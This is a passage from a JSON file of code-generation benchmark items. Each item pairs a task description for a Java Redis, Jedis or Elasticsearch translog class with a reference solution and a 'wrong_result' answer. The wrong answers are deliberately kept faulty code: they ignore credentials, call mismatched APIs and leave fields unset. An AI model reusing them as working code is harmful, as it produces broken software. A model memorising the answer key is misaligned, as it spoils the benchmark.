    "wrong_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisClusterClient;\nimport io.lettuce.core.StatefulRedisConnection;\nimport io.lettuce.core.StatefulRedisClusterConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.core.cluster.RedisClusterClient;\nimport java.util.Set;\n\npublic class RedisConnectionManager {\n    private RedisClient redisClient;\n    private RedisClusterClient redisClusterClient;\n    private TokenBasedRedisCredentialsProvider credentialsUser1;\n    private TokenBasedRedisCredentialsProvider credentialsUser2;\n\n    public RedisConnectionManager(String redisUri, String authority, Set<String> scopes, String user1ClientId, String user1Secret, String user2ClientId, String user2Secret) {\n        this.credentialsUser1 = new TokenBasedRedisCredentialsProvider(authority, scopes, user1ClientId, user1Secret);\n        this.credentialsUser2 = new TokenBasedRedisCredentialsProvider(authority, scopes, user2ClientId, user2Secret);\n        this.redisClient = RedisClient.create(redisUri);\n        this.redisClusterClient = RedisClusterClient.create(redisUri);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnection() {\n        return redisClient.connect();\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnectionWithUser2() {\n        return redisClient.connect();\n    }\n\n    public StatefulRedisClusterConnection<String, String> createClusterConnection() {\n        return redisClusterClient.connect();\n    }\n\n    public void close() {\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n        if (redisClusterClient != null) {\n            redisClusterClient.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 319,
    "Instruction": "Task Description: Create a singleton Redis client class that manages a single Redis connection instance throughout the application lifecycle, with automatic shutdown handling.\n\nClass Description: DefaultRedisClient is a singleton class that provides centralized Redis client management. It creates and maintains a single RedisClient instance, configures default timeout settings, and ensures proper resource cleanup during JVM shutdown.\n\nAttributes:\n- instance: DefaultRedisClient - The singleton instance of the class\n- redisClient: RedisClient - The underlying Redis client connection instance\n\nMethods:\n- get() -> RedisClient - Returns the singleton RedisClient instance after setting a default timeout of 60 seconds\n- DefaultRedisClient() (constructor) - Private constructor that initializes the RedisClient with connection settings and registers a shutdown hook\n- run() (in anonymous Thread class) - Shutdown hook method that cleans up Redis client resources during JVM shutdown",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.test.settings.TestSettings;\nimport java.util.concurrent.TimeUnit;\n\npublic class DefaultRedisClient {\n\n    private static final DefaultRedisClient instance = new DefaultRedisClient();\n\n    private RedisClient redisClient;\n\n    private DefaultRedisClient() {\n        redisClient = RedisClient.create(RedisURI.Builder.redis(TestSettings.host(), TestSettings.port()).build());\n        Runtime.getRuntime().addShutdownHook(new Thread() {\n            @Override\n            public void run() {\n                FastShutdown.shutdown(redisClient);\n            }\n        });\n    }\n\n    public static RedisClient get() {\n        instance.redisClient.setDefaultTimeout(60, TimeUnit.SECONDS);\n        return instance.redisClient;\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\npublic class DefaultRedisClient {\n    private static final DefaultRedisClient instance = new DefaultRedisClient();\n    private final RedisClient redisClient;\n\n    private DefaultRedisClient() {\n        redisClient = RedisClient.create(\"redis://localhost:6379\");\n        Runtime.getRuntime().addShutdownHook(new Thread(this::run));\n    }\n\n    public static DefaultRedisClient getInstance() {\n        return instance;\n    }\n\n    public RedisClient get() {\n        redisClient.setTimeout(60);\n        return redisClient;\n    }\n\n    private void run() {\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 32,
    "Instruction": "Task Description: Implement a TranslogReader class that handles reading operations from a transaction log (translog) file in Elasticsearch, including managing file channels, checkpoints, and ensuring thread-safe operations.\n\nClass Description: The TranslogReader class extends BaseTranslogReader and implements Closeable, providing functionality to read from a translog file while maintaining checkpoint information and ensuring proper resource management. It handles file channel operations, checkpoint updates, and provides thread-safe closing mechanisms.\n\nAttributes:\n- length: long - The length of the translog file in bytes.\n- totalOperations: int - The total number of operations recorded in the translog.\n- checkpoint: Checkpoint - The checkpoint information containing metadata about the translog state.\n- closed: AtomicBoolean - Thread-safe flag indicating whether the reader is closed.\n\nMethods:\n- TranslogReader(Checkpoint, FileChannel, Path, TranslogHeader) -> [Constructor] - Initializes a new TranslogReader with the given checkpoint, file channel, path, and translog header.\n- open(FileChannel, Path, Checkpoint, String) -> TranslogReader - Static method to open and initialize a TranslogReader instance with the specified parameters.\n- closeIntoTrimmedReader(long, ChannelFactory) -> TranslogReader - Closes the current reader and returns a new trimmed reader based on the specified sequence number, updating the checkpoint if necessary.\n- readBytes(ByteBuffer, long) -> void - Reads bytes from the translog file into the provided buffer at the specified position, with bounds checking.\n- close() -> void - Closes the file channel and marks the reader as closed in a thread-safe manner.\n- isClosed() -> boolean - Returns whether the reader is closed.\n- ensureOpen() -> void - Throws an AlreadyClosedException if the reader is closed.",
    "Canonical_solution": "import org.apache.lucene.store.AlreadyClosedException;\nimport org.elasticsearch.common.io.Channels;\nimport io.crate.common.io.IOUtils;\nimport org.elasticsearch.index.seqno.SequenceNumbers;\n\nimport java.io.Closeable;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\nimport static org.elasticsearch.index.translog.Translog.getCommitCheckpointFileName;\n\npublic class TranslogReader extends BaseTranslogReader implements Closeable {\n    protected final long length;\n    private final int totalOperations;\n    private final Checkpoint checkpoint;\n    protected final AtomicBoolean closed = new AtomicBoolean(false);\n\n    TranslogReader(final Checkpoint checkpoint, final FileChannel channel, final Path path, final TranslogHeader header) {\n        super(checkpoint.generation, channel, path, header);\n        this.length = checkpoint.offset;\n        this.totalOperations = checkpoint.numOps;\n        this.checkpoint = checkpoint;\n    }\n\n    public static TranslogReader open(\n            final FileChannel channel, final Path path, final Checkpoint checkpoint, final String translogUUID) throws IOException {\n        final TranslogHeader header = TranslogHeader.read(translogUUID, path, channel);\n        return new TranslogReader(checkpoint, channel, path, header);\n    }\n\n    TranslogReader closeIntoTrimmedReader(long aboveSeqNo, ChannelFactory channelFactory) throws IOException {\n        if (closed.compareAndSet(false, true)) {\n            Closeable toCloseOnFailure = channel;\n            final TranslogReader newReader;\n            try {\n                if (aboveSeqNo < checkpoint.trimmedAboveSeqNo\n                    || aboveSeqNo < checkpoint.maxSeqNo && checkpoint.trimmedAboveSeqNo == SequenceNumbers.UNASSIGNED_SEQ_NO) {\n                    final Path checkpointFile = path.getParent().resolve(getCommitCheckpointFileName(checkpoint.generation));\n                    final Checkpoint newCheckpoint = new Checkpoint(checkpoint.offset, checkpoint.numOps,\n                        checkpoint.generation, checkpoint.minSeqNo, checkpoint.maxSeqNo,\n                        checkpoint.globalCheckpoint, checkpoint.minTranslogGeneration, aboveSeqNo);\n                    Checkpoint.write(channelFactory, checkpointFile, newCheckpoint, StandardOpenOption.WRITE);\n\n                    IOUtils.fsync(checkpointFile, false);\n                    IOUtils.fsync(checkpointFile.getParent(), true);\n\n                    newReader = new TranslogReader(newCheckpoint, channel, path, header);\n                } else {\n                    newReader = new TranslogReader(checkpoint, channel, path, header);\n                }\n                toCloseOnFailure = null;\n                return newReader;\n            } finally {\n                IOUtils.close(toCloseOnFailure);\n            }\n        } else {\n            throw new AlreadyClosedException(toString() + \" is already closed\");\n        }\n    }\n\n    protected void readBytes(ByteBuffer buffer, long position) throws IOException {\n        if (position >= length) {\n            throw new EOFException(\"read requested past EOF. pos [\" + position + \"] end: [\" + length + \"]\");\n        }\n        if (position < getFirstOperationOffset()) {\n            throw new IOException(\"read requested before position of first ops. pos [\" + position + \"] first op on: [\" + getFirstOperationOffset() + \"]\");\n        }\n        Channels.readFromFileChannelWithEofException(channel, position, buffer);\n    }\n\n    @Override\n    public final void close() throws IOException {\n        if (closed.compareAndSet(false, true)) {\n            channel.close();\n        }\n    }\n\n    protected final boolean isClosed() {\n        return closed.get();\n    }\n\n    protected void ensureOpen() {\n        if (isClosed()) {\n            throw new AlreadyClosedException(toString() + \" is already closed\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.Closeable;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class TranslogReader extends BaseTranslogReader implements Closeable {\n    private final long length;\n    private final int totalOperations;\n    private final Checkpoint checkpoint;\n    private final AtomicBoolean closed;\n\n    public TranslogReader(Checkpoint checkpoint, FileChannel fileChannel, Path path, TranslogHeader header) {\n        super(fileChannel, path, header);\n        this.length = fileChannel.size();\n        this.totalOperations = header.totalOperations();\n        this.checkpoint = checkpoint;\n        this.closed = new AtomicBoolean(false);\n    }\n\n    public static TranslogReader open(FileChannel fileChannel, Path path, Checkpoint checkpoint, String translogUUID) throws IOException {\n        TranslogHeader header = TranslogHeader.read(fileChannel, path, translogUUID);\n        return new TranslogReader(checkpoint, fileChannel, path, header);\n    }\n\n    public TranslogReader closeIntoTrimmedReader(long sequenceNumber, ChannelFactory channelFactory) throws IOException {\n        if (closed.get()) {\n            throw new AlreadyClosedException(\"TranslogReader is already closed\");\n        }\n        FileChannel newChannel = channelFactory.open(path, false);\n        Checkpoint newCheckpoint = new Checkpoint(checkpoint.translogUUID(), sequenceNumber, checkpoint.offset(), checkpoint.totalOperations());\n        return new TranslogReader(newCheckpoint, newChannel, path, header);\n    }\n\n    public void readBytes(ByteBuffer buffer, long position) throws IOException {\n        if (closed.get()) {\n            throw new AlreadyClosedException(\"TranslogReader is already closed\");\n        }\n        if (position < 0 || position + buffer.remaining() > length) {\n            throw new IllegalArgumentException(\"Position out of bounds\");\n        }\n        fileChannel.read(buffer, position);\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (closed.compareAndSet(false, true)) {\n            fileChannel.close();\n        }\n    }\n\n    public boolean isClosed() {\n        return closed.get();\n    }\n\n    public void ensureOpen() {\n        if (closed.get()) {\n            throw new AlreadyClosedException(\"TranslogReader is already closed\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 320,
    "Instruction": "Task Description: Create a Java class that manages authentication and operations for a Redis cluster using Jedis client library, with support for token-based authentication and connection pooling.\n\nClass Description: RedisClusterAuthManager is a class that handles Redis cluster authentication and operations. It provides methods to execute basic Redis operations and test re-authentication functionality in a multi-threaded environment.\n\nAttributes:\n- idpConfig: [IdentityProviderConfig] - Configuration for the identity provider that generates authentication tokens\n- authXManager: [AuthXManager] - Manager responsible for handling authentication processes\n- config: [JedisClientConfig] - Configuration for the Jedis client\n- poolConfig: [ConnectionPoolConfig] - Configuration for the connection pool\n- hostAndPort: [HostAndPort] - Redis cluster endpoint information\n\nMethods:\n- RedisClusterAuthManager([HostAndPort hostAndPort]) -> [void] - Constructor that initializes the authentication manager with Redis cluster endpoint\n- executeRedisOperations() -> [void] - Executes basic Redis operations (set, get, delete) on the cluster\n- testReAuthentication() -> [void] - Tests re-authentication functionality in a multi-threaded environment, verifying that connections properly re-authenticate",
    "Canonical_solution": "import redis.clients.authentication.core.IdentityProvider;\nimport redis.clients.authentication.core.IdentityProviderConfig;\nimport redis.clients.authentication.core.SimpleToken;\nimport redis.clients.authentication.core.Token;\nimport redis.clients.authentication.entraid.EntraIDTokenAuthConfigBuilder;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.ConnectionPoolConfig;\nimport redis.clients.jedis.DefaultJedisClientConfig;\nimport redis.clients.jedis.EndpointConfig;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.JedisCluster;\n\npublic class RedisClusterAuthManager {\n\n    private final IdentityProviderConfig idpConfig;\n    private final AuthXManager authXManager;\n    private final JedisClientConfig config;\n    private final ConnectionPoolConfig poolConfig;\n    private final HostAndPort hostAndPort;\n\n    public RedisClusterAuthManager(HostAndPort hostAndPort) {\n        this.hostAndPort = hostAndPort;\n        this.idpConfig = new IdentityProviderConfig() {\n            @Override\n            public IdentityProvider getProvider() {\n                return new IdentityProvider() {\n                    @Override\n                    public Token requestToken() {\n                        return new SimpleToken(\"default\", \"cluster\",\n                                System.currentTimeMillis() + 5 * 1000, System.currentTimeMillis(),\n                                null);\n                    }\n                };\n            }\n        };\n        this.authXManager = new AuthXManager(EntraIDTokenAuthConfigBuilder.builder()\n                .lowerRefreshBoundMillis(1000).identityProviderConfig(idpConfig).build());\n        this.config = DefaultJedisClientConfig.builder().authXManager(authXManager).build();\n        this.poolConfig = new ConnectionPoolConfig();\n    }\n\n    public void executeRedisOperations() {\n        try (JedisCluster jc = new JedisCluster(hostAndPort, config, 5, poolConfig)) {\n            jc.set(\"foo\", \"bar\");\n            jc.get(\"foo\");\n            jc.del(\"foo\");\n        }\n    }\n\n    public void testReAuthentication() throws InterruptedException, ExecutionException {\n        AuthXManager spyManager = spy(authXManager);\n        List<Connection> connections = new ArrayList<>();\n        \n        doAnswer(invocation -> {\n            Connection connection = spy((Connection) invocation.getArgument(0));\n            invocation.getArguments()[0] = connection;\n            connections.add(connection);\n            Object result = invocation.callRealMethod();\n            return result;\n        }).when(spyManager).addConnection(any(Connection.class));\n\n        JedisClientConfig spyConfig = DefaultJedisClientConfig.builder().authXManager(spyManager).build();\n        \n        ExecutorService executorService = Executors.newFixedThreadPool(2);\n        CountDownLatch latch = new CountDownLatch(1);\n        \n        try (JedisCluster jc = new JedisCluster(Collections.singleton(hostAndPort), spyConfig)) {\n            Runnable task = () -> {\n                while (latch.getCount() > 0) {\n                    jc.set(\"foo\", \"bar\");\n                }\n            };\n            Future task1 = executorService.submit(task);\n            Future task2 = executorService.submit(task);\n\n            await().pollInterval(ONE_HUNDRED_MILLISECONDS).atMost(ONE_SECOND)\n                    .until(connections::size, greaterThanOrEqualTo(2));\n\n            connections.forEach(conn -> {\n                verify(conn, atLeast(2)).reAuthenticate();\n            });\n            \n            latch.countDown();\n            task1.get();\n            task2.get();\n        } finally {\n            latch.countDown();\n            executorService.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.HostAndPort;\n\npublic class RedisClusterAuthManager {\n    private IdentityProviderConfig idpConfig;\n    private AuthXManager authXManager;\n    private JedisClientConfig config;\n    private ConnectionPoolConfig poolConfig;\n    private HostAndPort hostAndPort;\n    private JedisPool jedisPool;\n\n    public RedisClusterAuthManager(HostAndPort hostAndPort) {\n        this.hostAndPort = hostAndPort;\n        this.jedisPool = new JedisPool(new JedisPoolConfig(), hostAndPort);\n    }\n\n    public void executeRedisOperations() {\n        try (Jedis jedis = jedisPool.getResource()) {\n            String token = authXManager.authenticate(idpConfig);\n            jedis.auth(token);\n            jedis.set(\"key\", \"value\");\n            String value = jedis.get(\"key\");\n            System.out.println(\"Retrieved value: \" + value);\n            jedis.del(\"key\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void testReAuthentication() {\n        Runnable task = () -> {\n            try (Jedis jedis = jedisPool.getResource()) {\n                String token = authXManager.authenticate(idpConfig);\n                jedis.auth(token);\n                jedis.set(\"threadKey\", \"threadValue\");\n                String value = jedis.get(\"threadKey\");\n                System.out.println(\"Thread retrieved value: \" + value);\n                jedis.del(\"threadKey\");\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        };\n\n        Thread thread1 = new Thread(task);\n        Thread thread2 = new Thread(task);\n\n        thread1.start();\n        thread2.start();\n\n        try {\n            thread1.join();\n            thread2.join();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 321,
    "Instruction": "Task Description: Implement a Redis cluster command executor in Java that handles command execution with retry logic, connection management, and error handling for a Redis cluster environment.\n\nClass Description: ClusterCommandExecutor is a Redis cluster command executor that provides functionality to execute commands across a Redis cluster with support for retries, connection pooling, and handling of various Redis cluster-specific exceptions.\n\nAttributes:\n- provider: ClusterConnectionProvider - Manages connections to the Redis cluster nodes\n- maxAttempts: int - Maximum number of retry attempts for command execution\n- maxTotalRetriesDuration: Duration - Maximum duration for all retry attempts\n- log: Logger - Logger instance for debugging and error logging\n\nMethods:\n- close() -> void - Closes the connection provider and releases resources\n- broadcastCommand(CommandObject<T> commandObject) -> T - Executes a command across all nodes in the cluster and collects responses/errors\n- executeCommand(CommandObject<T> commandObject) -> T - Executes a command on the primary node with retry logic\n- executeCommandToReplica(CommandObject<T> commandObject) -> T - Executes a command on a replica node with retry logic\n- doExecuteCommand(CommandObject<T> commandObject, boolean toReplica) -> T - Internal method handling the execution logic with retries and error handling\n- execute(Connection connection, CommandObject<T> commandObject) -> T - Executes a command on a specific connection\n- handleConnectionProblem(int attemptsLeft, int consecutiveConnectionFailures, Instant doneDeadline) -> boolean - Handles connection issues with backoff and slot cache renewal\n- getBackoffSleepMillis(int attemptsLeft, Instant deadline) -> long - Calculates backoff sleep duration for retries\n- sleep(long sleepMillis) -> void - Sleeps for the specified milliseconds, handling interruptions",
    "Canonical_solution": "import redis.clients.jedis.CommandObject;\nimport redis.clients.jedis.Connection;\nimport redis.clients.jedis.ConnectionPool;\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Protocol;\nimport redis.clients.jedis.exceptions.*;\nimport redis.clients.jedis.providers.ClusterConnectionProvider;\nimport redis.clients.jedis.util.IOUtils;\nimport java.time.Duration;\nimport java.time.Instant;\nimport java.util.Map;\nimport java.util.concurrent.ThreadLocalRandom;\nimport java.util.concurrent.TimeUnit;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class ClusterCommandExecutor implements CommandExecutor {\n\n  private final Logger log = LoggerFactory.getLogger(getClass());\n\n  public final ClusterConnectionProvider provider;\n  protected final int maxAttempts;\n  protected final Duration maxTotalRetriesDuration;\n\n  public ClusterCommandExecutor(ClusterConnectionProvider provider, int maxAttempts,\n      Duration maxTotalRetriesDuration) {\n    this.provider = provider;\n    this.maxAttempts = maxAttempts;\n    this.maxTotalRetriesDuration = maxTotalRetriesDuration;\n  }\n\n  @Override\n  public void close() {\n    this.provider.close();\n  }\n\n  @Override\n  public final <T> T broadcastCommand(CommandObject<T> commandObject) {\n    Map<String, ConnectionPool> connectionMap = provider.getConnectionMap();\n\n    boolean isErrored = false;\n    T reply = null;\n    JedisBroadcastException bcastError = new JedisBroadcastException();\n    for (Map.Entry<String, ConnectionPool> entry : connectionMap.entrySet()) {\n      HostAndPort node = HostAndPort.from(entry.getKey());\n      ConnectionPool pool = entry.getValue();\n      try (Connection connection = pool.getResource()) {\n        T aReply = execute(connection, commandObject);\n        bcastError.addReply(node, aReply);\n        if (isErrored) {\n        } else if (reply == null) {\n          reply = aReply;\n        } else if (reply.equals(aReply)) {\n        } else {\n          isErrored = true;\n          reply = null;\n        }\n      } catch (Exception anError) {\n        bcastError.addReply(node, anError);\n        isErrored = true;\n      }\n    }\n    if (isErrored) {\n      throw bcastError;\n    }\n    return reply;\n  }\n\n  @Override\n  public final <T> T executeCommand(CommandObject<T> commandObject) {\n    return doExecuteCommand(commandObject, false);\n  }\n\n  public final <T> T executeCommandToReplica(CommandObject<T> commandObject) {\n    return doExecuteCommand(commandObject, true);\n  }\n\n  private <T> T doExecuteCommand(CommandObject<T> commandObject, boolean toReplica) {\n    Instant deadline = Instant.now().plus(maxTotalRetriesDuration);\n\n    JedisRedirectionException redirect = null;\n    int consecutiveConnectionFailures = 0;\n    Exception lastException = null;\n    for (int attemptsLeft = this.maxAttempts; attemptsLeft > 0; attemptsLeft--) {\n      Connection connection = null;\n      try {\n        if (redirect != null) {\n          connection = provider.getConnection(redirect.getTargetNode());\n          if (redirect instanceof JedisAskDataException) {\n            connection.executeCommand(Protocol.Command.ASKING);\n          }\n        } else {\n          connection = toReplica ? provider.getReplicaConnection(commandObject.getArguments())\n              : provider.getConnection(commandObject.getArguments());\n        }\n\n        return execute(connection, commandObject);\n\n      } catch (JedisClusterOperationException jnrcne) {\n        throw jnrcne;\n      } catch (JedisConnectionException jce) {\n        lastException = jce;\n        ++consecutiveConnectionFailures;\n        log.debug(\"Failed connecting to Redis: {}\", connection, jce);\n        boolean reset = handleConnectionProblem(attemptsLeft - 1, consecutiveConnectionFailures, deadline);\n        if (reset) {\n          consecutiveConnectionFailures = 0;\n          redirect = null;\n        }\n      } catch (JedisRedirectionException jre) {\n        if (lastException == null || lastException instanceof JedisRedirectionException) {\n          lastException = jre;\n        }\n        log.debug(\"Redirected by server to {}\", jre.getTargetNode());\n        consecutiveConnectionFailures = 0;\n        redirect = jre;\n        if (jre instanceof JedisMovedDataException) {\n          provider.renewSlotCache(connection);\n        }\n      } finally {\n        IOUtils.closeQuietly(connection);\n      }\n      if (Instant.now().isAfter(deadline)) {\n        throw new JedisClusterOperationException(\"Cluster retry deadline exceeded.\");\n      }\n    }\n\n    JedisClusterOperationException maxAttemptsException\n        = new JedisClusterOperationException(\"No more cluster attempts left.\");\n    maxAttemptsException.addSuppressed(lastException);\n    throw maxAttemptsException;\n  }\n\n  protected <T> T execute(Connection connection, CommandObject<T> commandObject) {\n    return connection.executeCommand(commandObject);\n  }\n\n  private boolean handleConnectionProblem(int attemptsLeft, int consecutiveConnectionFailures, Instant doneDeadline) {\n    if (this.maxAttempts < 3) {\n      if (attemptsLeft == 0) {\n        provider.renewSlotCache();\n        return true;\n      }\n      return false;\n    }\n\n    if (consecutiveConnectionFailures < 2) {\n      return false;\n    }\n\n    sleep(getBackoffSleepMillis(attemptsLeft, doneDeadline));\n    provider.renewSlotCache();\n    return true;\n  }\n\n  private static long getBackoffSleepMillis(int attemptsLeft, Instant deadline) {\n    if (attemptsLeft <= 0) {\n      return 0;\n    }\n\n    long millisLeft = Duration.between(Instant.now(), deadline).toMillis();\n    if (millisLeft < 0) {\n      throw new JedisClusterOperationException(\"Cluster retry deadline exceeded.\");\n    }\n\n    long maxBackOff = millisLeft / (attemptsLeft * attemptsLeft);\n    return ThreadLocalRandom.current().nextLong(maxBackOff + 1);\n  }\n\n  protected void sleep(long sleepMillis) {\n    try {\n      TimeUnit.MILLISECONDS.sleep(sleepMillis);\n    } catch (InterruptedException e) {\n      throw new JedisClusterOperationException(e);\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport java.time.Duration;\nimport java.time.Instant;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class ClusterCommandExecutor<T> {\n    private final ClusterConnectionProvider provider;\n    private final int maxAttempts;\n    private final Duration maxTotalRetriesDuration;\n    private final Logger log;\n\n    public ClusterCommandExecutor(ClusterConnectionProvider provider, int maxAttempts, Duration maxTotalRetriesDuration, Logger log) {\n        this.provider = provider;\n        this.maxAttempts = maxAttempts;\n        this.maxTotalRetriesDuration = maxTotalRetriesDuration;\n        this.log = log;\n    }\n\n    public void close() {\n        provider.close();\n    }\n\n    public T broadcastCommand(CommandObject<T> commandObject) {\n        return doExecuteCommand(commandObject, false);\n    }\n\n    public T executeCommand(CommandObject<T> commandObject) {\n        return doExecuteCommand(commandObject, false);\n    }\n\n    public T executeCommandToReplica(CommandObject<T> commandObject) {\n        return doExecuteCommand(commandObject, true);\n    }\n\n    private T doExecuteCommand(CommandObject<T> commandObject, boolean toReplica) {\n        int attemptsLeft = maxAttempts;\n        Instant doneDeadline = Instant.now().plus(maxTotalRetriesDuration);\n        int consecutiveConnectionFailures = 0;\n\n        while (attemptsLeft > 0) {\n            try {\n                Connection connection = toReplica ? provider.getReplicaConnection() : provider.getPrimaryConnection();\n                return execute(connection, commandObject);\n            } catch (Exception e) {\n                log.error(\"Command execution failed\", e);\n                if (handleConnectionProblem(attemptsLeft, consecutiveConnectionFailures, doneDeadline)) {\n                    consecutiveConnectionFailures++;\n                } else {\n                    throw new RuntimeException(\"Failed to execute command after retries\", e);\n                }\n            } finally {\n                attemptsLeft--;\n            }\n        }\n\n        throw new RuntimeException(\"Failed to execute command after all retries\");\n    }\n\n    private T execute(Connection connection, CommandObject<T> commandObject) {\n        try {\n            return commandObject.execute(connection);\n        } catch (Exception e) {\n            log.error(\"Command execution failed on connection\", e);\n            throw e;\n        }\n    }\n\n    private boolean handleConnectionProblem(int attemptsLeft, int consecutiveConnectionFailures, Instant doneDeadline) {\n        long sleepMillis = getBackoffSleepMillis(attemptsLeft, doneDeadline);\n        if (sleepMillis > 0) {\n            sleep(sleepMillis);\n        }\n        return consecutiveConnectionFailures < 3; // Example condition for retrying\n    }\n\n    private long getBackoffSleepMillis(int attemptsLeft, Instant deadline) {\n        long remaining = Duration.between(Instant.now(), deadline).toMillis();\n        if (remaining <= 0) {\n            return 0;\n        }\n        return Math.min(1000L * (maxAttempts - attemptsLeft + 1), remaining);\n    }\n\n    private void sleep(long sleepMillis) {\n        try {\n            Thread.sleep(sleepMillis);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new RuntimeException(\"Sleep interrupted\", e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 322,
    "Instruction": "Task Description: Implement a Redis data access object (DAO) class in Java that provides functionality for caching and retrieving Seckill objects using Redis as the storage backend. The class should handle connection management, serialization/deserialization, and implement a cache-aside pattern with distributed locking.\n\nClass Description: RedisDao is a Java class that interacts with Redis to store and retrieve Seckill objects. It uses Jedis as the Redis client, Protostuff for serialization, and implements distributed locking for thread-safe operations.\n\nAttributes:\n- jedisPool: JedisPool - The connection pool for Redis connections\n- schema: RuntimeSchema<Seckill> - The Protostuff schema for Seckill object serialization\n\nMethods:\n- RedisDao(String ip, int port) -> void - Constructor that initializes the JedisPool with given Redis server IP and port\n- getSeckill(long seckillId) -> Seckill - Retrieves a Seckill object from Redis by its ID\n- getSeckill(long seckillId, Jedis jedis) -> Seckill - Retrieves a Seckill object from Redis using an existing Jedis connection\n- getOrPutSeckill(long seckillId, Function<Long, Seckill> getDataFromDb) -> Seckill - Implements cache-aside pattern with distributed locking, fetching from DB if not in cache\n- putSeckill(Seckill seckill) -> String - Stores a Seckill object in Redis with default expiration\n- putSeckill(Seckill seckill, Jedis jedis) -> String - Stores a Seckill object in Redis using an existing Jedis connection\n- getSeckillRedisKey(long seckillId) -> String - Helper method to generate Redis key for a Seckill object",
    "Canonical_solution": "import cn.codingxiaxw.entity.Seckill;\nimport cn.codingxiaxw.utils.JedisUtils;\nimport com.dyuproject.protostuff.LinkedBuffer;\nimport com.dyuproject.protostuff.ProtostuffIOUtil;\nimport com.dyuproject.protostuff.runtime.RuntimeSchema;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\n\nimport java.util.UUID;\nimport java.util.function.Function;\n\npublic class RedisDao {\n    private final JedisPool jedisPool;\n    private RuntimeSchema<Seckill> schema = RuntimeSchema.createFrom(Seckill.class);\n\n    public RedisDao(String ip, int port) {\n        jedisPool = new JedisPool(ip, port);\n    }\n\n    public Seckill getSeckill(long seckillId) {\n        return getSeckill(seckillId, null);\n    }\n\n    public Seckill getSeckill(long seckillId, Jedis jedis) {\n        boolean hasJedis = jedis != null;\n        try {\n            if (!hasJedis) {\n                jedis = jedisPool.getResource();\n            }\n            try {\n                String key = getSeckillRedisKey(seckillId);\n                byte[] bytes = jedis.get(key.getBytes());\n                if (bytes != null) {\n                    Seckill seckill = schema.newMessage();\n                    ProtostuffIOUtil.mergeFrom(bytes, seckill, schema);\n                    return seckill;\n                }\n            } finally {\n                if (!hasJedis) {\n                    jedis.close();\n                }\n            }\n        } catch (Exception e) {\n        }\n        return null;\n    }\n\n    public Seckill getOrPutSeckill(long seckillId, Function<Long, Seckill> getDataFromDb) {\n        String lockKey = \"seckill:locks:getSeckill:\" + seckillId;\n        String lockRequestId = UUID.randomUUID().toString();\n        Jedis jedis = jedisPool.getResource();\n\n        try {\n            while (true) {\n                Seckill seckill = getSeckill(seckillId, jedis);\n                if (seckill != null) {\n                    return seckill;\n                }\n                boolean getLock = JedisUtils.tryGetDistributedLock(jedis, lockKey, lockRequestId, 1000);\n                if (getLock) {\n                    seckill = getDataFromDb.apply(seckillId);\n                    putSeckill(seckill, jedis);\n                    return seckill;\n                }\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException ignored) {\n                }\n            }\n        } catch (Exception ignored) {\n        } finally {\n            JedisUtils.releaseDistributedLock(jedis, lockKey, lockRequestId);\n            jedis.close();\n        }\n        return null;\n    }\n\n    public String putSeckill(Seckill seckill) {\n        return putSeckill(seckill, null);\n    }\n\n    public String putSeckill(Seckill seckill, Jedis jedis) {\n        boolean hasJedis = jedis != null;\n        try {\n            if (!hasJedis) {\n                jedis = jedisPool.getResource();\n            }\n            try {\n                String key = getSeckillRedisKey(seckill.getSeckillId());\n                byte[] bytes = ProtostuffIOUtil.toByteArray(seckill, schema,\n                        LinkedBuffer.allocate(LinkedBuffer.DEFAULT_BUFFER_SIZE));\n                int timeout = 60 * 60;\n                return jedis.setex(key.getBytes(), timeout, bytes);\n            } finally {\n                if (!hasJedis) {\n                    jedis.close();\n                }\n            }\n        } catch (Exception e) {\n        }\n        return null;\n    }\n\n    private String getSeckillRedisKey(long seckillId) {\n        return \"seckill:\" + seckillId;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
